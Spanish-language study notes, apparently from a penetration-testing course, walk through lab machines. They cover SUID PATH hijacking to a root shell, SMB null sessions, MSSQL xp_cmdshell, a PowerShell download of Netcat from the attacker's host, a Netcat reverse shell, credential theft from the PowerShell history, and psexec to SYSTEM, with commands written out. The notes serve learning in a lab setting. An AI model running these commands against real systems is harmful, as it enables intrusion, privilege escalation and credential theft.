**Archetype — Escalada de Privilegios por PATH Hijacking**

Hasta ahora la escalada de privilegios se había resuelto con sudo -l o con GTFOBins. Esta máquina introduce un vector diferente: un binario SUID que se ejecuta como root y que internamente llama a cat sin especificar la ruta absoluta.

El flujo completo:

Primero, identificar el grupo inusual al que pertenece el usuario Robert con id. Aparece el grupo bugtracker. A continuación, buscar todos los archivos del sistema cuyo grupo dueño sea bugtracker:

```
find / -group bugtracker 2>/dev/null
```

Esto devuelve el binario /usr/bin/bugtracker. Al inspeccionarlo con ls -lh se ve algo crítico: tiene el bit SUID activado y pertenece a root. Esto significa que cuando se ejecuta, lo hace con los privilegios de root independientemente de quién lo lance.

El comando strings revela qué hace el binario internamente:

```
strings /usr/bin/bugtracker
```

En la salida se ve que el binario llama a cat sin ruta absoluta. En Linux, cuando un programa llama a cat sin la ruta completa, el sistema busca el ejecutable recorriendo las rutas que están en la variable de entorno PATH en orden. Ahí está la vulnerabilidad.

La explotación:

```
# Ir a /tmp, donde tenemos permisos de escritura para todos
cd /tmp

# Crear un "cat" malicioso que lanza una shell
echo -e '#!/bin/bash\n/bin/sh' > cat

# Darle permisos de ejecución
chmod +x cat

# Modificar el PATH para que /tmp sea el primer directorio donde buscar
export PATH=/tmp:$PATH

# Ejecutar el binario vulnerable
/usr/bin/bugtracker
```

Cuando el binario llama a cat, el sistema busca en /tmp primero, encuentra nuestro cat malicioso, y lo ejecuta como root. El resultado es una shell de root.

Una consecuencia directa de esta técnica es que cat ya no funciona normalmente durante la sesión, porque el sistema sigue usando el cat malicioso de /tmp. Para leer archivos hay que usar nano, more, head u otros comandos equivalentes.

- **La idea clave:** cuando un binario con SUID llama a comandos sin ruta absoluta, un atacante puede crear un ejecutable malicioso con el mismo nombre en un directorio con escritura y manipular el PATH para que el sistema lo encuentre antes que el real. El binario se ejecuta como root, así que el ejecutable malicioso también
    
- **La metáfora útil:** es como poner un ladrón disfrazado de cartero justo antes de la puerta de tu casa. Cuando llamas al cartero, el primero que responde es el impostsor

**LinPEAS y WinPEAS — Enumeración automática para escalada**

Se introduce formalmente la diferencia entre los dos scripts:

- **LinPEAS:** para máquinas Linux. Enumera permisos SUID, cron jobs, grupos inusuales, versiones de kernel con CVEs conocidos, configuraciones de servicios, historiales de comandos y decenas de vectores más
    
- **WinPEAS:** para máquinas Windows. Además de lo anterior, revisa el historial de PowerShell (donde los administradores a veces lanzan comandos con contraseñas en claro), configuraciones de antivirus, hashes de credenciales en herramientas como McAfee, drivers vulnerables y DLL hijacking
    

El código de colores es la clave para no perderse en la salida: rojo significa vector de alta probabilidad que hay que investigar, amarillo merece revisión, verde es informativo.

La recomendación de uso es siempre la misma: primero intentar las comprobaciones manuales rápidas (sudo -l, id, buscar SUID, revisar cron), y si no dan resultado, lanzar LinPEAS o WinPEAS como comodín.

**Primera Máquina Windows — SMB y MSSQL**

El escaneo revela los puertos 445 (SMB) y 1433 (MSSQL), además del 135 y otros típicos de Windows. No hay web, así que el vector de entrada es diferente a todo lo visto hasta ahora.

**SMB (puerto 445)** es el protocolo de compartición de archivos de Windows, equivalente conceptual a un pendrive en red. Muchas instalaciones permiten conexiones con cuentas nulas, es decir, sin usuario ni contraseña. Esto es el primer vector a probar siempre:

```
# Enumerar recursos compartidos con cuenta nula
smbclient -N -L //IP

# Conectarse a un recurso específico
smbclient -N //IP/backups
```

Los comandos dentro de la sesión SMB son similares a FTP: dir para listar, get para descargar. En la carpeta backups aparece un fichero de configuración con credenciales de SQL en texto plano: nombre de host, usuario y contraseña.

**Regla general:** cualquier fichero que contenga "config" en el nombre hay que abrirlo, porque con alta frecuencia contiene credenciales hardcodeadas.

**Impacket — Conexión a MSSQL y xp_cmdshell**

Impacket es una colección de herramientas de red escritas en Python, fundamental para auditorías en entornos Windows y Active Directory. Entre sus herramientas hay clientes para SMB, MSSQL, RDP, Kerberos y más. Para conectarse a MSSQL con las credenciales encontradas:

```
impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth
```

Una vez dentro de MSSQL, se pueden lanzar queries SQL normales, pero el objetivo es ir más allá: conseguir ejecución de comandos en el sistema operativo. Para eso existe xp_cmdshell, una funcionalidad de SQL Server que permite ejecutar comandos de la shell directamente desde la consola SQL.

El proceso para activarla requiere ser administrador del servidor SQL, lo que se verifica con:

sql

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Un resultado de 1 confirma que somos administradores. Con eso, se puede habilitar xp_cmdshell:

sql

```sql
-- Habilitar opciones avanzadas
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Habilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Verificar que está activo
EXEC sp_configure 'xp_cmdshell';

-- Ejecutar un comando de prueba
EXEC xp_cmdshell 'whoami';
```

- **La idea clave:** xp_cmdshell es la puerta de salida de SQL Server hacia el sistema operativo. Si conseguimos credenciales de un usuario con privilegios de administrador en SQL, podemos saltar al sistema operativo y ejecutar comandos como el usuario del servicio de SQL Server

**Transferencia de archivos a Windows y obtención de reverse shell**

Windows no tiene curl ni wget nativos en CMD, pero sí los tiene en PowerShell. El flujo para pasar herramientas desde la Cali a la máquina objetivo es siempre el mismo:

```
# En la Cali, levantar un servidor HTTP en el directorio donde están las herramientas
python3 -m http.server 80
```

Desde xp_cmdshell, usar PowerShell para descargar y ejecutar:

sql

```sql
-- Descargar NetCat a la carpeta public (permisos universales de escritura)
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://NUESTRA_IP/nc64.exe -OutFile C:\Users\Public\nc64.exe"';

-- Ejecutar NetCat para mandarnos una reverse shell
EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe NUESTRA_IP 4444';
```

Con Netcat escuchando en el puerto 4444, llega una CMD como el usuario del servicio SQL. La carpeta C:\Users\Public es el equivalente de /tmp en Linux: tiene permisos de escritura para todos los usuarios y es el destino estándar para dejar herramientas durante un pentest.

**WinPEAS y escalada por historial de PowerShell**

Una vez con CMD como usuario de servicio, se descarga y ejecuta WinPEAS. Entre toda la información que genera, aparece algo marcado en rojo: el historial de comandos de PowerShell. Un administrador había lanzado anteriormente un comando de backup que incluía usuario y contraseña del administrador local en texto claro.

Con esas credenciales, la escalada se completa con psexec de Impacket:

```
impacket-psexec administrador:contraseña@IP
```

Esto abre una CMD como NT AUTHORITY\SYSTEM, el equivalente a root en Windows. La flag de root está en C:\Users\Administrator\Desktop\root.txt y se lee con type (el equivalente de cat en Windows).

- **La metáfora útil:** el historial de PowerShell es como un post-it pegado en el monitor con la contraseña escrita. El administrador lo usó una vez para no olvidarla y lo dejó ahí para siempre
